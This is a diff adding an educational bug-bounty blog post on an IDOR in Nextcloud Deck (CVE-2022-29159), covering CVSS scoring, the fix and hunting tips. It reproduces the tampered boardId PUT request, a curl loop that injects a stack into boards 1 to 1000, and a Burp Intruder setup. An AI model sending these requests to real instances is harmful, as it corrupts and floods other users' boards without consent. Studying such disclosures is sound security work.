@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="IDOR in Nextcloud Deck — HackerOne #1450117 / CVE-2022-29159. How changing boardId in a stack rename request injected any attacker's list with all its cards into any other user's Kanban board." />
+  <title>IDOR: Inject Stacks into Any User's Board in Nextcloud Deck — HackerOne #1450117 | Blog — Darshak Patel</title>
+  <link rel="stylesheet" href="../../assets/css/style.css" />
+  <link rel="stylesheet" href="../../assets/css/pages/post.css" />
+</head>
+<body>
+
+<div class="read-progress" id="read-progress"></div>
+<canvas id="particles"></canvas>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">
+    <span class="bracket">[</span>dp<span class="bracket">]</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="../../pages/about.html">about</a></li>
+    <li><a href="../../pages/expertise.html">expertise</a></li>
+    <li><a href="../../pages/certifications.html">certifications</a></li>
+    <li><a href="../../pages/achievements.html">achievements</a></li>
+    <li><a href="../../pages/tools.html">tools</a></li>
+    <li><a href="../../pages/resources.html">resources</a></li>
+    <li><a href="../index.html" class="active">blog</a></li>
+    <li><a href="../../pages/contact.html">contact</a></li>
+  </ul>
+  <a href="mailto:your@email.com" class="nav-cta">Hire Me</a>
+  <div class="nav-hamburger" aria-label="menu">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<div class="post-wrap">
+
+  <!-- ── Hero ── -->
+  <div class="post-hero" data-vuln="idor">
+    <div class="post-hero-inner">
+      <a href="../index.html" class="post-back">← Back to Blog</a>
+      <div class="post-vuln-badge">⬡ IDOR</div>
+      <div class="post-meta">
+        <span class="post-tag">Bug Bounty</span>
+        <span class="post-tag">Web App</span>
+        <span class="post-tag" data-sev="medium">Medium · CVSS 5.0</span>
+        <span class="post-meta-sep">·</span>
+        <span>Jul 5, 2025</span>
+        <span class="post-meta-sep">·</span>
+        <span>9 min read</span>
+      </div>
+      <h1 class="post-h1">IDOR: Inject Stacks into Any User's Kanban Board in Nextcloud Deck — HackerOne #1450117</h1>
+      <p class="post-sub">How changing a single <code>boardId</code> field in a stack-rename request allowed any authenticated Nextcloud user to silently move their own list — complete with all cards, images, labels, and calendar entries — onto any other user's Kanban board, without their knowledge or consent. Assigned CVE-2022-29159.</p>
+      <div class="post-stats">
+        <div class="post-stat">
+          <span class="post-stat-label">Program</span>
+          <span class="post-stat-value">Nextcloud</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Report</span>
+          <span class="post-stat-value">#1450117</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">CVE</span>
+          <span class="post-stat-value">CVE-2022-29159</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Severity</span>
+          <span class="post-stat-value">Medium · 5.0</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Reporter</span>
+          <span class="post-stat-value">@supr4s</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-body">
+    <a href="https://hackerone.com/reports/1450117" target="_blank" rel="noopener" class="post-source">
+      ↗ HackerOne Report #1450117 — Nextcloud
+    </a>
+    <p class="post-attr">Independent educational breakdown of a publicly disclosed report. Credit for the original finding belongs to @supr4s (Supras).</p>
+  </div>
+
+  <div class="post-layout">
+
+    <aside class="post-toc">
+      <div class="toc-label">Contents</div>
+      <ul class="toc-list">
+        <li><a href="#background">Background</a></li>
+        <li><a href="#context">The Target</a></li>
+        <li><a href="#discovery">How It Was Found</a></li>
+        <li><a href="#bug">The Bug</a></li>
+        <li><a href="#request">The Exact Request</a></li>
+        <li><a href="#poc">Proof of Concept</a></li>
+        <li><a href="#notes">Additional Notes from the Report</a></li>
+        <li><a href="#impact">Real-World Impact</a></li>
+        <li><a href="#cvss">CVSS Breakdown</a></li>
+        <li><a href="#fix">The Fix</a></li>
+        <li><a href="#hunting">How to Hunt It</a></li>
+        <li><a href="#refs">References</a></li>
+      </ul>
+    </aside>
+
+    <article class="post-article">
+
+      <h2 id="background">Background</h2>
+      <p><strong>Insecure Direct Object Reference (IDOR)</strong> is an access control vulnerability where a server uses a client-supplied identifier to locate a resource — and fails to verify that the requesting user is authorised to perform the action on that resource. Change the ID, perform actions on objects you don't own.</p>
+      <p>This report — submitted by @supr4s (Supras) on <strong>14 January 2022</strong> and disclosed on <strong>20 May 2022</strong> — was assigned <strong>CVE-2022-29159</strong> and carries a CVSS score of <strong>5.0 (Medium)</strong>. It is a write IDOR with an unusual twist: rather than reading someone else's data, it <em>injects</em> data <em>into</em> a victim's workspace — silently and without any interaction from the target user.</p>
+      <p>Nextcloud resolved the issue and awarded a bounty. The official advisory was published by Nextcloud security engineer Joas Schilling.</p>
+
+      <h2 id="context">The Target</h2>
+      <p><strong>Nextcloud</strong> is a popular open-source, self-hosted collaboration platform used by organisations and individuals for file storage, calendars, contacts, and productivity apps. <strong>Nextcloud Deck</strong> is its Kanban-style project management app, inspired by Trello. The data model is:</p>
+      <ul>
+        <li><strong>Board</strong> — a Kanban workspace owned by a user (e.g. "Project Alpha"). Each board has a unique integer <code>boardId</code>.</li>
+        <li><strong>Stack</strong> — a column/list within a board (e.g. "To Do", "In Progress", "Done"). Each stack has a unique integer <code>id</code>.</li>
+        <li><strong>Card</strong> — an individual task within a stack. Cards can have attachments (images), labels, due dates, calendar entries, and descriptions.</li>
+      </ul>
+      <p>The bug was found on <strong>Nextcloud Hub II (v23)</strong> with Deck version <strong>1.6.0</strong>. All versions of Deck below 1.4.8, 1.5.6, and 1.6.1 were affected.</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Nextcloud Deck data model</span>
+        </div>
+        <pre><code>Board (boardId=14)          <span class="cc">← owned by User A</span>
+  └── Stack (id=31)         <span class="cc">← "To Do" list belonging to User A's board</span>
+        └── Card             <span class="cc">← task with image, label, calendar entry</span>
+        └── Card
+        └── Card
+
+Board (boardId=1)            <span class="cc">← owned by User B (the victim)</span>
+  └── Stack (id=...)         <span class="cc">← User B's existing lists</span></code></pre>
+      </div>
+
+      <h2 id="discovery">How It Was Found</h2>
+      <p>@supr4s was testing Nextcloud Deck with Burp Suite running as a proxy, intercepting all requests made by the application. While renaming an existing stack (list) on their own board, they captured the outgoing PUT request and inspected its JSON body.</p>
+      <p>The body contained both a stack identifier (<code>"id":31</code>) and a <code>"boardId":14</code> field — the board the stack currently belonged to. The researcher's instinct was direct: the <code>boardId</code> is a client-supplied parameter in a write operation. What happens if I change it to a board I do not own?</p>
+      <p>The answer: the server accepted the request, returned a 200 OK, and moved the stack — with all its cards and their contents — to the victim's board.</p>
+
+      <div class="post-note" data-type="tip"><strong>Hunter's instinct:</strong> in any write request (PUT, POST, PATCH), look at every field in the JSON body, not just the URL path. Fields like <code>boardId</code>, <code>ownerId</code>, <code>workspaceId</code>, <code>projectId</code>, <code>teamId</code> are ownership identifiers that developers sometimes forget to validate server-side because "the UI would never send the wrong value." Intercept the request and change that value yourself.</div>
+
+      <h2 id="bug">The Bug</h2>
+      <p>The Deck API endpoint for updating a stack — <code>PUT /apps/deck/stacks/{stackId}</code> — accepted a JSON body that included a <code>boardId</code> field. This field was meant to indicate which board the stack belonged to. The server used this client-supplied value to reassign the stack's parent board — <strong>without verifying that the requesting user had any access rights to the target board</strong>.</p>
+      <p>The authorization gap had two missing checks:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Authorization checks — what existed vs what was missing</span>
+        </div>
+        <pre><code><span class="cc"># What the server checked</span>
+<span class="ck">PUT</span> /apps/deck/stacks/<span class="cv">31</span>
+body: {<span class="cv">"boardId"</span>: <span class="ch">1</span>, <span class="cv">"id"</span>: <span class="cv">31</span>, ...}
+
+<span class="cc"># ✓ Is the user authenticated?</span>
+<span class="cc"># ✓ Does stack id=31 exist?</span>
+<span class="cc"># ✓ Does User A own stack id=31? (checked on the stack level)</span>
+
+<span class="cc"># ✗ Does User A have access to boardId=1 (the DESTINATION board)?  ← MISSING</span>
+<span class="cc"># ✗ Is boardId=1 owned by or shared with User A?                   ← MISSING</span>
+
+<span class="cc"># Result: stack 31 — with all its cards — moved to User B's board</span>
+<span class="cc"># HTTP 200 OK returned, boardId in response confirms: "boardId":1</span></code></pre>
+      </div>
+
+      <p>The server validated the <em>source</em> (the stack being moved) but completely ignored authorization on the <em>destination</em> (the board it was being moved to). This is a pattern seen frequently in move/transfer operations: developers check "can the user act on the source object?" but forget to check "can the user act on the destination?"</p>
+
+      <h2 id="request">The Exact Request</h2>
+      <p>@supr4s included the full HTTP request and response in the report. Here they are exactly as disclosed:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Vulnerable PUT request — boardId changed to victim's board</span>
+        </div>
+        <pre><code><span class="ck">PUT</span> <span class="cf">/apps/deck/stacks/31</span> HTTP/1.1
+<span class="ck">Host:</span> nextcloud.yourserver.com
+<span class="ck">Content-Type:</span> application/json;charset=utf-8
+<span class="ck">requesttoken:</span> &lt;token&gt;
+<span class="ck">Cookie:</span> <span class="cs">&lt;user_a_session_cookies&gt;</span>
+
+{
+  <span class="cv">"title"</span>: <span class="cs">"IDOR"</span>,
+  <span class="cv">"boardId"</span>: <span class="ch">1</span>,          <span class="cc">← changed from 14 (attacker's) to 1 (victim's)</span>
+  <span class="cv">"deletedAt"</span>: <span class="cn">0</span>,
+  <span class="cv">"lastModified"</span>: <span class="cn">1642201857</span>,
+  <span class="cv">"order"</span>: <span class="cn">0</span>,
+  <span class="cv">"id"</span>: <span class="cn">31</span>,             <span class="cc">← stack ID (attacker's own stack)</span>
+  <span class="cv">"ETag"</span>: <span class="cs">"a5f7e3ab477ee2a2259f0889a63130a8"</span>
+}</code></pre>
+      </div>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Server response — 200 OK confirms the cross-board injection</span>
+        </div>
+        <pre><code>HTTP/1.1 <span class="cok">200 OK</span>
+Content-Type: application/json; charset=utf-8
+Strict-Transport-Security: max-age=31536000; includeSubDomains;
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+
+{
+  <span class="cv">"title"</span>: <span class="cs">"IDOR_REPORT"</span>,
+  <span class="cv">"boardId"</span>: <span class="cok">1</span>,          <span class="cc">← server confirms stack is now on board 1 (victim's)</span>
+  <span class="cv">"deletedAt"</span>: <span class="cn">0</span>,
+  <span class="cv">"lastModified"</span>: <span class="cn">1642201857</span>,
+  <span class="cv">"order"</span>: <span class="cn">0</span>,
+  <span class="cv">"id"</span>: <span class="cn">31</span>,
+  <span class="cv">"ETag"</span>: <span class="cs">"a5f7e3ab477ee2a2259f0889a63130a8"</span>
+}</code></pre>
+      </div>
+
+      <p>The 200 response body is the definitive proof. The server echoes <code>"boardId":1</code> — confirming that stack 31 now belongs to board 1 (the victim's board). The move was accepted, applied, and confirmed in a single unauthenticated-destination request.</p>
+
+      <h2 id="poc">Proof of Concept</h2>
+      <p>The reproduction steps as reported by @supr4s:</p>
+      <ol>
+        <li><strong>Setup:</strong> Two Nextcloud user accounts — User A (attacker) and User B (victim) — with no board sharing or permissions between them. Note each user's <code>boardId</code> from their respective boards.</li>
+        <li><strong>User A</strong> renames any existing stack on their own board. Burp Suite intercepts the resulting <code>PUT /apps/deck/stacks/{id}</code> request.</li>
+        <li>In the intercepted request body, <strong>change <code>boardId</code> from User A's board ID (14) to User B's board ID (1)</strong>. Forward the modified request.</li>
+        <li><strong>Server responds with HTTP 200</strong> — body confirms <code>"boardId":1</code>. The stack has been moved to User B's board.</li>
+        <li><strong>User B</strong> opens their board — the attacker's stack (with all its cards) now appears on their board without their knowledge or consent.</li>
+      </ol>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Mass injection — brute-forcing boardId to flood all boards</span>
+        </div>
+        <pre><code><span class="cc"># Inject the same stack into every board (boardId 1 → 1000)</span>
+<span class="cc"># Each 200 response = a successful cross-board injection</span>
+<span class="ck">for</span> boardId <span class="ck">in</span> $(seq <span class="cn">1</span> <span class="cn">1000</span>); <span class="ck">do</span>
+  curl -s -X PUT \
+    -H <span class="cs">"Content-Type: application/json"</span> \
+    -H <span class="cs">"requesttoken: &lt;token&gt;"</span> \
+    -b <span class="cs">"&lt;user_a_session&gt;"</span> \
+    -d <span class="cv">"{\"title\":\"spam\",\"boardId\":${boardId},\"deletedAt\":0,\"lastModified\":1642201857,\"order\":0,\"id\":31,\"ETag\":\"a5f7e3ab477ee2a2259f0889a63130a8\"}"</span> \
+    <span class="cf">"https://nextcloud.yourserver.com/apps/deck/stacks/31"</span>
+<span class="ck">done</span>
+
+<span class="cc"># Result: stack 31 injected into every board on the instance</span>
+<span class="cc"># All users see an unexpected list appear on their board — no interaction required</span></code></pre>
+      </div>
+
+      <div class="post-note"><strong>No victim interaction required.</strong> The victim does not click anything, receive an email, or take any action. The stack simply appears on their board the next time they open Deck. The attack is entirely passive and silent from the victim's side.</div>
+
+      <h2 id="notes">Additional Notes from the Report</h2>
+      <p>@supr4s documented several important behavioural details that significantly deepen the impact assessment:</p>
+      <ul>
+        <li>
+          <strong>Works in both directions regardless of privilege.</strong>
+          An unprivileged user can inject into another unprivileged user's board. An unprivileged user can also inject into an administrator's board. There is no privilege barrier to exploitation.
+        </li>
+        <li>
+          <strong>Full card contents are imported.</strong>
+          The injected stack carries all its cards with it — including attached images, labels, calendar entries, due dates, and descriptions. This is not just a stub list appearing; it is a full data transplant into the victim's board.
+        </li>
+        <li>
+          <strong>Deletion is bidirectionally linked.</strong>
+          If the victim deletes the injected stack from their board, it is also deleted from the attacker's board. This creates an adversarial dependency: the attacker's data is now coupled to the victim's actions. The attacker can use this as a harassment or denial-of-service vector — repeatedly re-injecting stacks that the victim keeps deleting.
+        </li>
+        <li>
+          <strong>Unlimited injection possible.</strong>
+          There is no rate limit or count check. An attacker can inject an unlimited number of stacks onto a victim's board, flooding it to the point of making it unusable.
+        </li>
+      </ul>
+
+      <div class="post-note" data-type="tip"><strong>The bidirectional deletion detail is particularly significant.</strong> It means the attack doesn't just add noise to the victim's board — it creates a persistent, cross-user data link that the victim cannot cleanly sever without affecting the attacker. This is an unusual side-effect that would only be discovered by actually testing the full attack flow, not just confirming the initial injection. Always follow through the complete lifecycle of the attack in your PoC.</div>
+
+      <h2 id="impact">Real-World Impact</h2>
+      <p>Nextcloud Deck is used extensively in enterprise and team environments — by development teams, project managers, and individuals managing sensitive work. The impact of this vulnerability is multi-dimensional:</p>
+      <ul>
+        <li>
+          <strong>Workspace integrity violation.</strong>
+          A Kanban board represents a user's organised work — tasks, projects, priorities. Having foreign stacks injected silently corrupts that workspace. In a professional context, this is a serious integrity breach.
+        </li>
+        <li>
+          <strong>Information disclosure (indirect).</strong>
+          The injected stack carries the attacker's cards — including whatever text, labels, and attachments are on them. This could be used to deliver content (disinformation, inappropriate material, phishing links in card descriptions) directly into a victim's workspace.
+        </li>
+        <li>
+          <strong>Platform-wide denial of service against individual users.</strong>
+          By brute-forcing boardId from 1 to N and injecting stacks in a loop, an attacker can flood every user's board on the Nextcloud instance simultaneously. Each victim's board becomes unusable under an infinite number of injected lists.
+        </li>
+        <li>
+          <strong>Cross-privilege exploitation.</strong>
+          Because the bug works against administrators too, a low-privileged user can disrupt admin workspaces — a privilege escalation in terms of impact even if not in terms of data access.
+        </li>
+        <li>
+          <strong>Scope: Changed (CVSS S:C).</strong>
+          The CVSS scoring reflects this correctly: the vulnerability's scope changes because the integrity impact falls on a resource (User B's board) that is entirely outside User A's security context. This is what justifies the S:C rating.
+        </li>
+      </ul>
+
+      <h2 id="cvss">CVSS Breakdown</h2>
+      <p>Nextcloud's security team scored this at <strong>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N — 5.0 (Medium)</strong>. Let's walk through each metric:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N — annotated</span>
+        </div>
+        <pre><code><span class="cv">AV:N</span>   Attack Vector: Network          <span class="cc">← exploitable over the internet</span>
+<span class="cv">AC:L</span>   Attack Complexity: Low          <span class="cc">← one HTTP request, no special conditions</span>
+<span class="cv">PR:L</span>   Privileges Required: Low        <span class="cc">← needs a valid Nextcloud account (any user)</span>
+<span class="cv">UI:N</span>   User Interaction: None          <span class="cc">← victim doesn't click or do anything</span>
+<span class="cv">S:C</span>    Scope: Changed                  <span class="cc">← impact crosses to victim's security boundary</span>
+<span class="cv">C:N</span>    Confidentiality: None           <span class="cc">← attacker reads no data from the victim</span>
+<span class="cv">I:L</span>    Integrity: Low                  <span class="cc">← limited write to victim's board</span>
+<span class="cv">A:N</span>    Availability: None              <span class="cc">← scored None (flood potential could argue A:L)</span>
+
+<span class="cc">Final score: 5.0 (Medium)</span>
+<span class="cc">Note: C:N keeps this at Medium — no confidential data is read from the victim.</span>
+<span class="cc">If the bug also leaked card content from victim's board, C:L would push it to High.</span></code></pre>
+      </div>
+
+      <p>The <strong>S:C (Scope Changed)</strong> rating is the most significant metric here. It distinguishes this from a typical self-contained integrity issue — the attacker's action directly and permanently affects a resource in another user's security domain. This is what raises the score above what the I:L alone would produce.</p>
+
+      <h2 id="fix">The Fix</h2>
+      <p>The fix was released in Deck versions <strong>1.4.8, 1.5.6, and 1.6.1</strong> for the three supported version branches. Nextcloud confirmed <strong>no workaround was available</strong> — upgrading was the only remediation.</p>
+      <p>The correct server-side fix is to validate that the destination <code>boardId</code> is accessible to the requesting user before executing the stack move:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Pseudocode — before and after the fix</span>
+        </div>
+        <pre><code><span class="cc"># Before the fix — destination board not checked</span>
+<span class="ck">def</span> <span class="cf">update_stack</span>(stack_id, title, board_id, ...):
+    stack = Stack.find(stack_id)
+    <span class="ck">if not</span> current_user.<span class="cv">owns</span>(stack):        <span class="cc"># source check: present</span>
+        <span class="ck">return</span> <span class="ch">403</span>
+    stack.board_id = board_id               <span class="cc"># ← destination never checked</span>
+    stack.title    = title
+    stack.save()
+    <span class="ck">return</span> stack
+
+<span class="cc"># After the fix — both source AND destination validated</span>
+<span class="ck">def</span> <span class="cf">update_stack</span>(stack_id, title, board_id, ...):
+    stack        = Stack.find(stack_id)
+    target_board = Board.find(board_id)
+
+    <span class="cc"># Check 1: does the user own/have write access to the source stack?</span>
+    <span class="ck">if not</span> current_user.<span class="cv">owns</span>(stack):
+        <span class="ck">return</span> <span class="ch">403 Forbidden</span>
+
+    <span class="cc"># Check 2: does the user own/have write access to the destination board?</span>
+    <span class="ck">if not</span> current_user.<span class="cv">can_write</span>(target_board):
+        <span class="ck">return</span> <span class="ch">403 Forbidden</span>
+
+    stack.board_id = board_id
+    stack.title    = title
+    stack.save()
+    <span class="ck">return</span> stack</code></pre>
+      </div>
+
+      <p>The principle generalises to all move/transfer operations: <strong>any action that relocates an object from one container to another must verify the user's access rights on both the source container and the destination container</strong>. Checking only the source is half an authorization model.</p>
+
+      <h2 id="hunting">How to Hunt IDOR on Move / Transfer Operations</h2>
+      <ul>
+        <li>
+          <strong>Find every move or transfer operation in the application.</strong>
+          "Move to board", "transfer to project", "reassign to workspace", "copy to folder" — these are your primary targets for destination-blind IDORs. In Burp's site map, look for PUT/POST/PATCH requests where the body contains two different resource IDs: one for the object being moved and one for its destination.
+        </li>
+        <li>
+          <strong>Identify all ownership fields in JSON request bodies.</strong>
+          Fields named <code>boardId</code>, <code>projectId</code>, <code>workspaceId</code>, <code>ownerId</code>, <code>parentId</code>, <code>folderId</code>, <code>teamId</code> are ownership or destination identifiers that must be validated server-side. Developers often validate the ID of the <em>object being acted on</em> but trust the destination ID as legitimate because "the UI controls it."
+        </li>
+        <li>
+          <strong>Change the destination ID to one you don't own.</strong>
+          With two test accounts (A and B), note Board B's ID. While logged in as User A, perform a move operation and intercept the request. Change the destination <code>boardId</code> to Board B's ID. If the server returns 200 — confirmed destination IDOR.
+        </li>
+        <li>
+          <strong>Test the full lifecycle, not just the initial injection.</strong>
+          In this report, the bidirectional deletion behaviour was a key detail that deepened the impact. After confirming the initial bug, explore what happens when the victim modifies or deletes the injected object. Does it affect the attacker's original? Does it create a persistent cross-user coupling?
+        </li>
+        <li>
+          <strong>Test upward privilege escalation specifically.</strong>
+          Confirm whether the bug works from a standard user into an admin's board. If it does, document that explicitly — it significantly strengthens the severity argument because it represents a privilege boundary being crossed, not just a peer-to-peer access issue.
+        </li>
+        <li>
+          <strong>Enumerate the blast radius.</strong>
+          Because boardIds are sequential integers starting from 1, a loop over a range confirms scale of impact. Document the enumeration in your report — showing "I can inject into all N boards on this instance" is far more convincing than "I can inject into one specific board I already know about."
+        </li>
+      </ul>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Burp Intruder — test boardId range for cross-board injection</span>
+        </div>
+        <pre><code><span class="cc"># Use Burp Intruder on the boardId field to confirm affected range</span>
+<span class="cc"># Payload: sequential integers 1 → 100</span>
+<span class="cc"># Look for: 200 responses with "boardId": &lt;non-own-id&gt; in the response body</span>
+
+PUT /apps/deck/stacks/31 HTTP/1.1
+Host: nextcloud.yourserver.com
+Content-Type: application/json
+Cookie: <span class="cs">&lt;user_a_session&gt;</span>
+
+{<span class="cv">"title"</span>:<span class="cs">"test"</span>,<span class="cv">"boardId"</span>:<span class="ch">§1§</span>,<span class="cv">"deletedAt"</span>:0,<span class="cv">"lastModified"</span>:1642201857,<span class="cv">"order"</span>:0,<span class="cv">"id"</span>:31,<span class="cv">"ETag"</span>:<span class="cs">"a5f7e3ab..."</span>}
+
+<span class="cc"># Intruder payload type: Numbers, from 1 to 100, step 1</span>
+<span class="cc"># Filter: 200 status + response boardId != 14 (your own board)</span>
+<span class="cc"># Each match = another user's board successfully injected into</span>
+<span class="cc"># Use only your own test boards to confirm — never inject into real user boards</span></code></pre>
+      </div>
+
+      <div class="post-note"><strong>Responsible disclosure:</strong> to confirm this class of bug, create two boards on two separate test accounts and verify the injection between your own test accounts only. Never inject stacks into real users' boards — the bug is proven the moment your own test stack appears on your own second test board. Document the request, the 200 response with the confirmed destination <code>boardId</code>, and stop.</div>
+
+      <hr class="post-divider" />
+
+      <h2 id="refs">References</h2>
+      <ul class="post-refs">
+        <li><a href="https://hackerone.com/reports/1450117" target="_blank" rel="noopener">[1] HackerOne Report #1450117 — IDOR in Nextcloud Deck boardId</a></li>
+        <li><a href="https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vqhf-673w-7r3j" target="_blank" rel="noopener">[2] Nextcloud Security Advisory GHSA-vqhf-673w-7r3j</a></li>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29159" target="_blank" rel="noopener">[3] NVD — CVE-2022-29159</a></li>
+        <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" target="_blank" rel="noopener">[4] OWASP WSTG — Testing for Insecure Direct Object References</a></li>
+        <li><a href="https://portswigger.net/web-security/access-control/idor" target="_blank" rel="noopener">[5] PortSwigger Web Security Academy — IDOR</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank" rel="noopener">[6] CWE-639 — Authorization Bypass Through User-Controlled Key</a></li>
+      </ul>
+
+      <div class="post-nav">
+        <a href="./blog-h1-45960-idor-vimeo-private-channel.html" class="post-nav-link">
+          <span class="post-nav-dir">← Previous Post</span>
+          <span class="post-nav-title">IDOR: Access Videos of Any Private Vimeo Channel via Montage Widget #45960</span>
+        </a>
+      </div>
+
+    </article>
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2025 <span class="f-name">Darshak Patel</span> · B.Tech CSE Cybersecurity</p>
+  <div class="f-links">
+    <a href="../../index.html">Home</a>
+    <a href="../../pages/about.html">About</a>
+    <a href="../../pages/expertise.html">Expertise</a>
+    <a href="../../pages/certifications.html">Certifications</a>
+    <a href="../../pages/achievements.html">Achievements</a>
+    <a href="../../pages/tools.html">Tools</a>
+    <a href="../../pages/resources.html">Resources</a>
+    <a href="../index.html">Blog</a>
+    <a href="../../pages/contact.html">Contact</a>
+  </div>
+</footer>
+
+<script src="../../assets/js/main.js"></script>
+<script>
+  (function () {
+    const bar = document.getElementById('read-progress');
+    function update() {
+      const h = document.documentElement;
+      const pct = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+      bar.style.width = Math.min(pct, 100) + '%';
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    update();
+  })();
+  (function () {
+    const links = document.querySelectorAll('.toc-list a');
+    const headings = Array.from(document.querySelectorAll('.post-article h2[id]'));
+    if (!links.length || !headings.length) return;
+    function onScroll() {
+      const top = window.scrollY + 100;
+      let active = headings[0];
+      for (const h of headings) { if (h.offsetTop <= top) active = h; }
+      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + active.id));
+    }
+    window.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
+  })();
+</script>
+</body>
+</html>
